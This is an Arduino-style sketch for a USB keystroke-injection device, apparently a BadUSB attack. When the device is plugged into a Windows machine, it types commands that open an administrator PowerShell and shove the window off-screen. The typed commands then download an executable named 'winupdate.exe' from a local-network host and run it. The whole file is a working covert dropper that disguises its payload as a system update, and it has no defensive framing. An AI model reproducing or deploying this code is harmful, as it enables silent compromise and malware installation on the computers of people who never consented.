#include <kb.h>
#include <windows.h>

extern uint8_t key[8];

void setup() 
{
  kb_init();
  WIND;
  DELAY;
  GUI;
  DELAY;
  printKey("powershell");
  DELAY;
  ADMIN_ENTER;
  DELAY;DELAY;DELAY;
  ALTO;
  DELAY;DELAY;DELAY;
  SYSMENU;
  writeKey(KB_L, 0, 0);
  DELAY;
  for(int i = 0; i < 300; i++)
    writeKey(KB_D_ARROW, 0, 0);
  DELAY;DELAY;
  ENTER;
  printKey("$client = new-object System.Net.WebClient");
  DELAY;
  ENTER;
  DELAY;
  printKey("$client.DownloadFile(\"http://192.168.1.16/winupdate.exe\",\"winupdate.exe\")");
  DELAY;
  ENTER;
  delay(2000);
  printKey(".\\winupdate.exe");
  DELAY;
  ENTER;
  
}

void loop() 
{
  // put your main code here, to run repeatedly:

}
